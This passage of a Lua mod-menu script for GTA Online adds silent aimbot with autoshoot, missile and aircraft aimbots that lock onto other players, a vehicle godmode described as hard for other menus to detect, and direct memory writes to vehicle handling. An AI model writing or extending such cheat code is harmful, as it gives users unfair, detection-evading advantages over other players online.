menu.slider(MenuWeaponSAim, "Silent Aim Mode", {"gssilentaimmode"}, "The Mode in which Silent Aimbot will Shoot the Bullet.\n\n1 - The Bullet will Spawn in Front of the Player and Hit them. Tends to Miss Players in Vehicles.\n\n2 - The Bullet will Spawn on your Player and go to the Target.", 1, 2, 1, 1, function(value)
    sAimMode = value
end)

sAimFov = 15
menu.slider(MenuWeaponSAim, "Silent Aim FoV", {"gssilentaimfov"}, "The FoV that the Silent Aimbot will Target Players in.", 1, 270, 15, 1, function(value)
    sAimFov = value
end)

sAimAutoShoot = false
menu.toggle(MenuWeaponSAim, "Autoshoot", {"gssilentaimautoshoot"}, "Automatically Shoots when Silent Aim gets a Target.", function(on)
    if sAimAutoShoot == false then sAimAutoShoot = true else sAimAutoShoot = false end
end)

showSAimTarget = false
menu.toggle(MenuWeaponSAim, "Show Target", {"gssilentaimdisplaytarget"}, "Wether or not to Show the Person who is Currently being Targeted.", function(on)
    if showSAimTarget == false then showSAimTarget = true else showSAimTarget = false end
end)


--[[| Self/Weapon/Quickrocket/ |]]--
menu.action(MenuWeaponQR, "Quick Rocket", {"gsquickrocket"}, "This will Switch to the Homing Launcher, Wait until you Shoot, then Switch back.", function(on_click)
    local localped = players.user_ped()
    if on_click then
        util.create_thread(function ()
            local currentWpMem = memory.alloc()
            local junk = WEAPON.GET_CURRENT_PED_WEAPON(localped, currentWpMem, 1)
            local currentWP = memory.read_int(currentWpMem)
            memory.free(currentWpMem)
            WEAPON.SET_CURRENT_PED_WEAPON(localped, 1672152130, false) --1672152130 is Homing Launcher
            local WaitForShoot = true
            while WaitForShoot do
                if PED.IS_PED_SHOOTING(localped) then
                    WEAPON.SET_CURRENT_PED_WEAPON(localped, 741814745, LegitSwitchB1)
                    util.yield(200)
                    WEAPON.SET_CURRENT_PED_WEAPON(localped, currentWP,LegitSwitchB2)
                    WaitForShoot = false
                end
                util.yield()
            end
            util.stop_thread()
        end)
    end
end)

menu.slider(MenuWeaponQR, "Quick Rocket Mode", {"gsquickrocketmode"}, "Wether to Skip the Weapon Switch Animation or to Play Through it.\\n\n1 - Non-Legit; Skib Both Animations\n2 - Semi-Legit; Skip One Animation\n3 - Full-Legit; Don't Skip any Animations", 1, 3, 1, 1, function(value)
    if value == 1 then LegitSwitchB1 = true ; LegitSwitchB2 = true
    elseif value == 2 then LegitSwitchB1 = false ; LegitSwitchB2 = true
    elseif value == 3 then LegitSwitchB1 = false ; LegitSwitchB2 = false end 
end)


--[[| Self/Weapon/MissleGuidance/MA/ |]]--
homing_missles = false
menu.toggle(MenuWeaponMA, "Missle Aimbot", {"gsmissleaimbot"}, "Rotates any Missle or Bomb Towards the Nearest player in the set Range. Aims a little Ahead, in Attempt to cut the Target off.", function(on)
    homing_missles = on
    mod_uses("object", if on then 1 else -1)
end)

HomingM_SelectedMissle = util.joaat("w_lr_homing_rocket")
menu.slider(MenuWeaponMA, "Missle Aimbot Selected Missle", {"gsmissleaimbotmissle"}, "The Missle that will be used for 'Missle Aimbot'.\n\n1 - RPG\n2 - Homing Launcher\n3 - Oppressor Missle\n4 - B-11 Barrage\n5 - B-11 Homing\n6 - Chernobog Missle\n7 - Explosive Bomb\n8 - Incendiary Bomb\n9 - Gas Bomb\n10 - Cluster Bomb", 1, 10, 2, 1, function(value)
    if value == 1 then HomingM_SelectedMissle = util.joaat("w_lr_rpg_rocket")
    elseif value == 2 then HomingM_SelectedMissle = util.joaat("w_lr_homing_rocket")
    elseif value == 3 then HomingM_SelectedMissle = util.joaat("w_ex_vehiclemissile_3")
    elseif value == 4 then HomingM_SelectedMissle = util.joaat("w_smug_airmissile_01b")
    elseif value == 5 then HomingM_SelectedMissle = util.joaat("w_battle_airmissile_01")
    elseif value == 6 then HomingM_SelectedMissle = util.joaat("w_ex_vehiclemissile_4")
    elseif value == 7 then HomingM_SelectedMissle = util.joaat("w_smug_bomb_01")
    elseif value == 8 then HomingM_SelectedMissle = util.joaat("w_smug_bomb_02")
    elseif value == 9 then HomingM_SelectedMissle = util.joaat("w_smug_bomb_03")
    elseif value == 10 then HomingM_SelectedMissle = util.joaat("w_smug_bomb_04") end
end)

homing_missle_range = 1000
menu.slider(MenuWeaponMA, "Missle Aimbot Range", {"gsmissleaimbotrange"}, "Range at which the Missle you Shoot will Track.", 50, 35000, 1000, 50, function(value)
    homing_missle_range = value
    homing_missle_range_org = value
end)


--[[| Self/Weapon/MissleGuidance/MCLOS/ |]]--
missle_MCLOS = false
menu.toggle(MenuWeaponMCLOS, "MCLOS", {"gsmclos"}, "MCLOS is Manual Missle Guidance. Use the Numpad 4, 5, 6, 8 to Control any Missle you Fire Manually.", function(on)
    missle_MCLOS = on
    mod_uses("object", if on then 1 else -1)
end)

MCLOS_SelectedMissle = util.joaat("w_lr_homing_rocket")
menu.slider(MenuWeaponMCLOS, "MCLOS Selected Missle", {"gsmclosmissle"}, "The Missle that will be used for MCLOS Guidance.\n\n1 - RPG\n2 - Homing Launcher\n3 - Oppressor Missle\n4 - B-11 Barrage\n5 - B-11 Homing\n6 - Chernobog Missle\n7 - Explosive Bomb\n8 - Incendiary Bomb\n9 - Gas Bomb\n10 - Cluster Bomb", 1, 10, 2, 1, function(value)
    if value == 1 then MCLOS_SelectedMissle = util.joaat("w_lr_rpg_rocket")
    elseif value == 2 then MCLOS_SelectedMissle = util.joaat("w_lr_homing_rocket")
    elseif value == 3 then MCLOS_SelectedMissle = util.joaat("w_ex_vehiclemissile_3")
    elseif value == 4 then MCLOS_SelectedMissle = util.joaat("w_smug_airmissile_01b")
    elseif value == 5 then MCLOS_SelectedMissle = util.joaat("w_battle_airmissile_01")
    elseif value == 6 then MCLOS_SelectedMissle = util.joaat("w_ex_vehiclemissile_4")
    elseif value == 7 then MCLOS_SelectedMissle = util.joaat("w_smug_bomb_01")
    elseif value == 8 then MCLOS_SelectedMissle = util.joaat("w_smug_bomb_02")
    elseif value == 9 then MCLOS_SelectedMissle = util.joaat("w_smug_bomb_03")
    elseif value == 10 then MCLOS_SelectedMissle = util.joaat("w_smug_bomb_04") end
end)

MCLOS_controlModeU = 111
MCLOS_controlModeD = 110
MCLOS_controlModeL = 108
MCLOS_controlModeR = 109
MCLOS_mouseControl = false
menu.slider(MenuWeaponMCLOS, "MCLOS Control Mode", {"gsmcloscontrol"}, "What you use to Control the Missle.\n\n1 - Nmp; 8, 4, 5, 6\n2 - Mouse Control", 1, 2, 1, 1, function(value)
    if value == 1 then
        MCLOS_controlModeU = 111
        MCLOS_controlModeD = 110
        MCLOS_controlModeL = 108
        MCLOS_controlModeR = 109
        MCLOS_mouseControl = false
    elseif value == 2 then
        MCLOS_mouseControl = true
    end
end)

MCLOS_MaxSpeed = 50
menu.slider(MenuWeaponMCLOS, "MCLOS Missle Speed", {"gsmclosspeed"}, "Speed Limit of the MCLOS Missle.", 10, 500, 50, 5, function(value)
    MCLOS_MaxSpeed = value
end)

MCLOS_TurnSpeed = 2
menu.slider(MenuWeaponMCLOS, "MCLOS Missle Turn Rate", {"gsmclosturn"}, "Turn Rate of the MCLOS Missle.", 1, 10, 2, 1, function(value)
    MCLOS_TurnSpeed = value
end)


--[[| Self/Weapon/MissleGuidance/SACLOS/ |]]--
missle_SACLOS = false
menu.toggle(MenuWeaponSACLOS, "SACLOS", {"gssaclos"}, "SACLOS is Semi-Automatic Missle Guidance. The Missle will go to where your Cursor Points.", function(on)
    missle_SACLOS = on
    mod_uses("object", if on then 1 else -1)
end)

SACLOS_SelectedMissle = util.joaat("w_lr_homing_rocket")
menu.slider(MenuWeaponSACLOS, "SACLOS Selected Missle", {"gssaclosmissle"}, "The Missle that will be used for SACLOS Guidance.\n\n1 - RPG\n2 - Homing Launcher\n3 - Oppressor Missle\n4 - B-11 Barrage\n5 - B-11 Homing\n6 - Chernobog Missle\n7 - Explosive Bomb\n8 - Incendiary Bomb\n9 - Gas Bomb\n10 - Cluster Bomb", 1, 10, 2, 1, function(value)
    if value == 1 then SACLOS_SelectedMissle = util.joaat("w_lr_rpg_rocket")
    elseif value == 2 then SACLOS_SelectedMissle = util.joaat("w_lr_homing_rocket")
    elseif value == 3 then SACLOS_SelectedMissle = util.joaat("w_ex_vehiclemissile_3")
    elseif value == 4 then SACLOS_SelectedMissle = util.joaat("w_smug_airmissile_01b")
    elseif value == 5 then SACLOS_SelectedMissle = util.joaat("w_battle_airmissile_01")
    elseif value == 6 then SACLOS_SelectedMissle = util.joaat("w_ex_vehiclemissile_4")
    elseif value == 7 then SACLOS_SelectedMissle = util.joaat("w_smug_bomb_01")
    elseif value == 8 then SACLOS_SelectedMissle = util.joaat("w_smug_bomb_02")
    elseif value == 9 then SACLOS_SelectedMissle = util.joaat("w_smug_bomb_03")
    elseif value == 10 then SACLOS_SelectedMissle = util.joaat("w_smug_bomb_04") end
end)

SACLOS_MaxSpeed = 50
menu.slider(MenuWeaponSACLOS, "SACLOS Missle Speed", {"gssaclosspeed"}, "Speed Limit of the SACLOS Missle.", 10, 500, 50, 5, function(value)
    SACLOS_MaxSpeed = value
end)

SACLOS_drawLaser = false
menu.toggle(MenuWeaponSACLOS, "Laser", {"gssacloslaser"}, "Draws a Laser Straight in Front of you. Doesn't Affect the way the Missle Works, just Visual.", function(on)
    if on then SACLOS_drawLaser = true else SACLOS_drawLaser = false end
end)



--[[| Vehicle/Main/Movement/ |]]--
menu.toggle_loop(MenuVehMovement, "Shift to Drift", {"gsshifttodrift"}, "This will Lower you Car's Traction when Holding Shift. I Reccomend Tapping Shift to Actually Drift, since you can Vary the Drift's Turn Rate that way.", function(on)    
    if PAD.IS_CONTROL_PRESSED(21, 21) then
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
        VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(player_cur_car, 0.0)
    else
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
    end
end)

menu.toggle_loop(MenuVehMovement, "Nitrous", {"gsnitrous"}, "Use your Standard Boost Keybind to Toggle Nitrous in any Car.", function(on)
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) and player_cur_car ~= 0 then
        if PAD.IS_CONTROL_JUST_PRESSED(357, 357) then
            request_ptfx_asset('veh_xs_vehicle_mods')  
            VEHICLE.SET_OVERRIDE_NITROUS_LEVEL(player_cur_car, true, 100, 1, 99999999999, false)
            repeat util.yield() until PAD.IS_CONTROL_JUST_PRESSED(357, 357)
            VEHICLE.SET_OVERRIDE_NITROUS_LEVEL(player_cur_car, false, 0, 0, 0, false)
        end
    end
end)

menu.toggle_loop(MenuVehMovement, "Horn Boost", {"gshornboost"}, "Use your Horn Button to Boost your Car Forwards.", function(on)    
    if player_cur_car ~= 0 then
        VEHICLE.SET_VEHICLE_ALARM(player_cur_car, false)
        if AUDIO.IS_HORN_ACTIVE(player_cur_car) then
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_cur_car, 1, 0.0, 1.0, 0.0, true, true, true, true)
        end
    end
end)

menu.toggle_loop(MenuVehMovement, "Downforce",{"gsdownforce"}, "When Toggled, this Applies a Strong Downforce to you Car. It makes it Stick to Walls aswell.", function(on)    
    if player_cur_car ~= 0 then
        local vel = ENTITY.GET_ENTITY_VELOCITY(player_cur_car)
        vel['z'] = -vel['z']
        ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 2, 0, 0, -50 -vel['z'], 0, 0, 0, 0, true, false, true, false, true)
    end
end)

menu.toggle_loop(MenuVehMovement, "Instant Engine Start", {"gsinstantcarengine"}, "Instantly Starts the Engine of a Vehicle when you get in it.", function(on)
    TurnCarOnInstantly()
end)

v_f_previous_car = 0
vflyspeed = 100
v_fly = false
v_f_plane = 0
local ls_vehiclefly = menu.toggle_loop(MenuVehMovement, "Vehicle Fly", {"gsvehfly"}, "Makes your Vehicle Fly Wherever you Look. The Vehicle still has Collision though!", function(on) 
    if player_cur_car ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        ENTITY.SET_ENTITY_MAX_SPEED(player_cur_car, vflyspeed)
        local c = CAM.GET_GAMEPLAY_CAM_ROT(0)
        ENTITY.SET_ENTITY_ROTATION(player_cur_car, c.x, c.y, c.z, 0, true)
        any_c_pressed = false
        --W
        local x_vel = 0.0
        local y_vel = 0.0
        local z_vel = 0.0
        if PAD.IS_CONTROL_PRESSED(32, 32) then
            x_vel = vflyspeed
        end 
        --A
        if PAD.IS_CONTROL_PRESSED(63, 63) then
            y_vel = -vflyspeed
        end
        --S
        if PAD.IS_CONTROL_PRESSED(33, 33) then
            x_vel = -vflyspeed
        end
        --D
        if PAD.IS_CONTROL_PRESSED(64, 64) then
            y_vel = vflyspeed
        end
        if x_vel == 0.0 and y_vel == 0.0 and z_vel == 0.0 then
            ENTITY.SET_ENTITY_VELOCITY(player_cur_car, 0.0, 0.0, 0.0)
        else
            local angs = ENTITY.GET_ENTITY_ROTATION(player_cur_car, 0)
            local spd = ENTITY.GET_ENTITY_VELOCITY(player_cur_car)
            if angs.x > 1.0 and spd.z < 0 then
                z_vel = -spd.z 
            else
                z_vel = 0.0
            end
            ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 3, y_vel, x_vel, z_vel, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
        end
    end
end, function()
    if player_cur_car ~= 0 then
        ENTITY.SET_ENTITY_HAS_GRAVITY(player_cur_car, true)
    end
end)

menu.slider(MenuVehMovement, "Vehicle Fly Speed", {"gsvehflyspeed"}, "Set the Speed at which 'Vehicle Fly' will Fly at.", 1, 3000, 100, 50, function(s)
    vflyspeed = s
end)

menu.action(MenuVehMovement, "Flip Upside-Down", {"gsflipupsidedown"}, "Flips your Current Car Upside-Down. Useful with the Oppressor MK2 for Flying Upside Down.", function(on_click)
    local veh = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    local vv = ENTITY.GET_ENTITY_ROTATION(veh, 2)
    local vvYaw = v3.getZ(vv)
    ENTITY.SET_ENTITY_ROTATION(veh, 0, 179.5, vvYaw, 2, true)
end)


--[[| Vehicle/Main/Visual/Main/ |]]--
menu.click_slider(MenuVehVisualMain, "Suspension Height", {"gssuspensionheight"}, "Use this to set your Vehicle's Suspension Height.\nThis is only Client Side, and is on a Per-Car Basis, and will keep the Suspension Setting for that Car until you Restart your Game or Change it back.", -500, 500, 0, 5, function(value)
    SuspHeight = value
    SuspHeight = SuspHeight / 100
    local ped = players.user_ped()
    local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    if VehicleHandle == 0 then return end
    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
    memory.write_float(CHandlingData + 0x00D0, SuspHeight)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(VehicleHandle, pos.x, pos.y, pos.z + 2.8, false, false, false)
end)

menu.click_slider(MenuVehVisualMain, "Vehicle Dirt Level", {"gsdirtlevel"}, "Sets the Dirt Level on your Vehicle. Set to 0 to Completely Clean your Vehicle.", 0, 15, 0, 1, function(s)    
    if player_cur_car ~= 0 then
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(player_cur_car, s)
    end
end)

menu.click_slider(MenuVehVisualMain, "Set Transform State", {"gstransformstate"}, "This lets you set the Transform State of the Deluxo and Oppressor. The Number is Divided by 10 Due to Sliders not being able to use Decimals. So 1 is .1, 10 is .1, etc. 0 is Hover off, 1 is hover on. Every Number in between will make it a Kind of Half Hover State. Any Value above 10 will Glitch the Wheels above the Deluxo.", 0, 100, 0, 1, function(value)
    local valueToDec = value / 10
    VEHICLE.SET_SPECIAL_FLIGHT_MODE_TARGET_RATIO(player_cur_car, valueToDec)
end)

menu.toggle_loop(MenuVehVisualMain, "True Rainbow Colours", {"gstruerainbow"}, "Makes your Car Switch through the Actual Colours of the Rainbow, not just Random ones.", function(on)    
    VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(player_cur_car, tr, tg, tb)
    VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(player_cur_car, tr, tg, tb)
    VEHICLE.SET_VEHICLE_NEON_COLOUR(player_cur_car, tr, tg, tb)
end)

menu.toggle_loop(MenuVehVisualMain, "Smooth Rainbow", {"gssmoothrainbow"}, "Makes your Car Slowly Fade through Colours of the Rainbow.", function(on)    
    VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(player_cur_car, randR, randG, randB)
    VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(player_cur_car, randR, randG, randB)
    VEHICLE.SET_VEHICLE_NEON_COLOUR(player_cur_car, randR, randG, randB)
end)


--[[| Vehicle/Main/Visual/Lights/ |]]--
menu.toggle_loop(MenuVisualLights, "Turn Signals", {"gsturnsignals"}, "Makes your Car's Turn Signals Blink when Holding the Cooresponding Direction (A/D).\nThis is Client-Sided Only, so Other Players won't See this!", function(on)    
    if player_cur_car ~= 0 then
        local left = PAD.IS_CONTROL_PRESSED(34, 34)
        local right = PAD.IS_CONTROL_PRESSED(35, 35)
        if left then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(player_cur_car, 1, true)
        elseif right then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(player_cur_car, 0, true)
        end
        if not left then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(player_cur_car, 1, false)
        end
        if not right then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(player_cur_car, 0, false)
        end
    end
end)

menu.toggle(MenuVisualLights, "Hazard Lights", {"gshazardlights"}, "While this is On, your Car's Hazard Lights will Blink.\nThis is Client-Sided Only, so Other Players won't See this!", function(on)    
    if player_cur_car ~= 0 then
        if on then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(player_cur_car, 1, true)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(player_cur_car, 0, true)
            util.yield(500)
        else
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(player_cur_car, 1, false)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(player_cur_car, 0, false) 
        end
    end
end)

menu.toggle(MenuVisualLights, "Left Turn Signal", {"gsleftturnsignal"}, "Turn on the Left Blinker", function(on)
    if on then
        VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(player_cur_car, 1, true)
    else
        VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(player_cur_car, 1, false)
    end
end)

menu.toggle(MenuVisualLights, "Right Turn Signal", {"gsrightturnsignal"}, "Turn on the Right Blinker.", function(on)
    if on then
        VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(player_cur_car, 0, true)
    else
        VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(player_cur_car, 0, false)
    end
end)

menu.toggle(MenuVisualLights, "Brake Lights", {"gsbrakelights"}, "Toggle your Vehicle's Brake Lights.", function(on)
    if on then VEHICLE.SET_VEHICLE_BRAKE_LIGHTS(player_cur_car, true) else VEHICLE.SET_VEHICLE_BRAKE_LIGHTS(player_cur_car, false) end
end)


--[[| Vehicle/Main/HealthArmour/ |]]--
menu.toggle_loop(MenuVehHealth, "Stealth Godmode", {"gsvehstealthgm"}, "Most Menus won't Detect this as Vehicle Godmode.", function(on)
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), true, true, true, true, true, 0, 0, true)
    ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(players.user(), false), false, false, false, false, false, 0, 0, false)
end)

menu.toggle(MenuVehHealth, "Bulletproof", {"gsvehiclebulletproof"}, "Makes the Windows on your Car Bulletproof. Does not Godmode your Car though, and Only Works for Some Cars!", function(on)
    if player_cur_car ~= 0 then
        if on then ENTITY.SET_ENTITY_PROOFS(player_cur_car, true, false, false, false, false, false, false, false) else ENTITY.SET_ENTITY_PROOFS(player_cur_car, false, false, false, false, false, false, false, false) end
    end
end)

menu.toggle_loop(MenuVehHealth, "No C4 on Vehicle", {"gsnostickyonvehicle"}, "While Toggled, this will Automatically Remove any C4 that is Attatched to your Vehicle.", function(on)
    if player_cur_car ~= 0 then
        NETWORK.REMOVE_ALL_STICKY_BOMBS_FROM_ENTITY(player_cur_car, players.user_ped())
    end 
end)

menu.toggle_loop(MenuVehHealth, "Never Damaged", {"gsvehneverdamaged"}, "Constantly Repairs your Vehicle so it doesn't get Damaged or Deformed. Can also be used to Rapid Fire Vehicle Weapons INSANELY Fast.", function(on)   
    if GET_VEHICLE_HEALTH_PERCENTAGE(player_cur_car, 100.0, 100.0, 100.0, 100.0, 100.0, 100.0) < 100.0 then
        VEHICLE.SET_VEHICLE_FIXED(player_cur_car)
        VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(player_cur_car)
    end
end)


--[[| Vehicle/Main/Aircraft/Jet/ |]]--
b11FixToggle = menu.toggle_loop(MenuJet, "B-11 'Fix'", {"gsjetfix"}, "Only Works on the B-11. Makes the Cannon like how it is in Real Life; Insanely Fast.", function(on)
    if VEHICLE.IS_VEHICLE_MODEL(player_cur_car, 1692272545) then
        local playerA10 = player_cur_car
        local cannonBonePos = ENTITY.GET_ENTITY_BONE_POSTION(playerA10, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(playerA10, "weapon_1a"))
        local target = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerA10, 0, 175, 0)
        if PAD.IS_CONTROL_PRESSED(114, 114) then
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cannonBonePos['x'], cannonBonePos['y'], cannonBonePos['z'], target['x']+math.random(-3,3), target['y']+math.random(-3,3), target['z']+math.random(-3,3), 100.0, true, 3800181289, players.user_ped(), true, false, 100.0)
        end
    else
        util.toast("-Genesis-\n\nYou have to be in a B-11 to use this!")
        menu.trigger_command(b11FixToggle, "off")
    end
end)


--[[| Vehicle/Main/Aircraft/Helicopter/ |]]--
menu.click_slider(MenuHeli, "Heli Power", {"gshelipower"}, "Increases or Decreased the Helicopter Thrust.\nDefault is 50", 0, 1000, 50, 10, function (value)
    if player_cur_car ~= 0 then
        local heliHandlingBase = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
        if heliHandlingBase then
            memory.write_float(heliHandlingBase + thrust_offset, value * 0.01)
            util.toast("-Genesis-\n\nHelicopter Power set to "..value)
        else
            util.toast("-Genesis-\n\nCould not Change Thrust Power.\nGet in a Heli First!")
        end
    end
end)

local toggle=false
menuHeliStabalizeToggle = menu.toggle(MenuHeli, "Disable Auto-Stabilization", {"gsnohelistabalize"}, "Disables Helicopter Auto-Stabilization.", function(on)
    if toggle==false then toggle=true elseif toggle==true then toggle=false end
    local currentHeli = player_cur_car
    local heliHandlingBase = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    local handlingValues = {}
    if heliHandlingBase and VEHICLE.GET_VEHICLE_CLASS(player_cur_car) == 15 then
        if on then
            for i, offset in pairs(heliHandlingOffsets) do handlingValues[i] = memory.read_float(heliHandlingBase+offset) end
            for i, offset in pairs(heliHandlingOffsets) do memory.write_float(heliHandlingBase + offset, 0) end
            util.toast("-Genesis-\n\nHeli Auto-Stabilization has been Disabled.")
            repeat 
                if player_cur_car ~= currentHeli then 
                    playerChangedVehicle = true
                    break
                else util.yield() end 
            until not toggle
            for i, offset in pairs(heliHandlingOffsets) do memory.write_float(heliHandlingBase+offset, handlingValues[i]) end
            if not playerChangedVehicle then util.toast("-Genesis-\n\nHeli Auto-Stabilization has been Enabled.") else
                util.toast("-Genesis-\n\nReset Heli Auto-Stabilization due to Vehicle Change.")
                menu.trigger_command(menuHeliStabalizeToggle, "off")
                util.yield(100)
                playerChangedVehicle = false
            end
        end
    elseif not playerChangedVehicle then util.toast("-Genesis-\n\nCould not Disable Auto-Stabilization.\nGet in a Heli First!") end
end)

menu.toggle_loop(MenuHeli, "Instant Engine Startup", {"gsinstantheliengine"}, "When Active, Helicopter Engines will Instantly Spin up to Full RPM.", function(on)
    if player_cur_car ~= 0 then
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(player_cur_car)
    end
end)


--[[| Vehicle/Main/Aircraft/Universal/ |]]--
aircraftAimbotAnyVehicle = false
menu.toggle_loop(MenuAircraftUniversal, "Aircraft Aimbot", {"gsaircraftaimbot"}, "Makes any Aircraft Snap Directly to the Nearest Person.", function ()
    local p = GetClosestPlayerWithRange_Whitelist(200)
    local localped = players.user_ped()
    local localcoords2 = ENTITY.GET_ENTITY_COORDS(localped)
    if p ~= nil and not PED.IS_PED_DEAD_OR_DYING(p) and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(localped, p, 17) and not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p)] and (not players.is_in_interior(NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p))) and (not players.is_godmode(NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p))) then
        if PED.IS_PED_IN_ANY_VEHICLE(localped) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
            if aircraftAimbotAnyVehicle == false then
                if VEHICLE.GET_VEHICLE_CLASS(veh) == 15 or VEHICLE.GET_VEHICLE_CLASS(veh) == 16 then
                    local pcoords2 = PED.GET_PED_BONE_COORDS(p, 24817, 0, 0, 0)
                    local look2 = v3.lookAt(localcoords2, pcoords2)
                    local look = GetTableFromV3Instance(look2)
                    ENTITY.SET_ENTITY_ROTATION(veh, look.x, look.y, look.z, 1, true)
                end
            else
                if veh ~= nil then
                    local pcoords2 = PED.GET_PED_BONE_COORDS(p, 24817, 0, 0, 0)
                    local look2 = v3.lookAt(localcoords2, pcoords2)
                    local look = GetTableFromV3Instance(look2)
                    ENTITY.SET_ENTITY_ROTATION(veh, look.x, look.y, look.z, 1, true)
                end
            end
        end
    end
end)

menu.toggle(MenuAircraftUniversal, "Aircraft Aimbot in Any Vehicle", {"gsaircraftaimbotanyveh"}, "Lets you use Aircraft Aimbot not just for Aircrafts, but any Vehicle in the Game.", function(on)
    if on then aircraftAimbotAnyVehicle = true else aircraftAimbotAnyVehicle = false end
end)


--[[| Vehicle/Main/PersonalVehicle/ |]]--
exclusiveVehicle = 0
local setExclusiveVehicleToggle = menu.toggle(MenuVehPersonal, "Set Exclusive Vehicle", {"gsvehicleexclusive"}, "Sets you as the Exclusive Driver of your Current Vehicle, making you the Only One able to Drive it.", function(on)
    local localped = players.user_ped()
    if on then 
        VEHICLE.SET_VEHICLE_EXCLUSIVE_DRIVER(player_cur_car, localped, 1) 
        exclusiveVehicle = player_cur_car
        util.toast("-Genesis-\n\nSuccessfully Set Current Vehicle as Exclusive Vehicle.")
        exclusiveVehBlip = HUD.ADD_BLIP_FOR_ENTITY(exclusiveVehicle)
        HUD.SET_BLIP_SPRITE(exclusiveVehBlip, 812) --Missle Icon ID
        HUD.SET_BLIP_COLOUR(exclusiveVehBlip, 29)
        while on do
            HUD.SET_BLIP_ROTATION(exclusiveVehBlip, math.ceil(ENTITY.GET_ENTITY_HEADING(exclusiveVehicle)))
            if not VEHICLE.IS_VEHICLE_DRIVEABLE(exclusiveVehicle, false) then
                HUD.SET_BLIP_COLOUR(exclusiveVehBlip, 1)
            elseif not VEHICLE.IS_VEHICLE_DRIVEABLE(exclusiveVehicle, true) then
                HUD.SET_BLIP_COLOUR(exclusiveVehBlip, 17)
            else
                HUD.SET_BLIP_COLOUR(exclusiveVehBlip, 29)
            end
            util.yield()
        end
    else 
        VEHICLE.SET_VEHICLE_EXCLUSIVE_DRIVER(player_cur_car, localped, 0)
        util.remove_blip(exclusiveVehBlip)
        exclusiveVehicle = 0
        util.toast("-Genesis-\n\nSuccessfully Removed Current Vehicle as Exclusive Vehicle.")
    end
end)

menu.toggle(MenuVehPersonal, "Lock Vehicle", {"gsvehicleexclusivekickpassengers"}, "Locks your Exclusive Vehicle.", function(on)
    if on then 
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(exclusiveVehicle, true)
        util.toast("-Genesis-\n\nLocked your Exclusive Vehicle.") 
    else 
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(exclusiveVehicle, false) 
        util.toast("-Genesis-\n\nUnlocked your Exclusive Vehicle.")
    end
end)

menu.action(MenuVehPersonal, "Delete Exclusive Vehicle", {'gsvehicledeleteexclusive'}, "Deletes your Current Exclusive Vehicle.", function(on_click)
    if not exclusiveVehicle then
        util.toast("-Genesis-\n\nNo Exclusive Vehicle Currently set!\nYou can Set One using the 'Set Exclusive Driver' Command Above.")
    end
    util.remove_blip(exclusiveVehBlip)
    menu.trigger_command(setExclusiveVehicleToggle, "off")
    entities.delete_by_handle(exclusiveVehicle)
    util.toast("-Genesis-\n\nExclusive Vehicle Deleted.")
end)

menu.action(MenuVehPersonal, "Explode Exclusive Vehicle", {"gsvehicleexplodeexclusive"}, "Puts an Owned Explosion on your Current Exclusive Vehicle.", function(on_click)
    local localped = players.user_ped()
    local exclusiveVehVector = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(exclusiveVehicle, 0, 0, 0)
    if not exclusiveVehicle then
        util.toast("-Genesis-\n\nNo Exclusive Vehicle Currently set!\nYou can Set One using the 'Set Exclusive Driver' Command Above")
    end
    FIRE.ADD_OWNED_EXPLOSION(localped, exclusiveVehVector['x'], exclusiveVehVector['y'], exclusiveVehVector['z'], 4, 100, true, true, 1.0)
end)


--[[| Vehicle/Other/Doors/ |]]--
InstantDoorBool = false
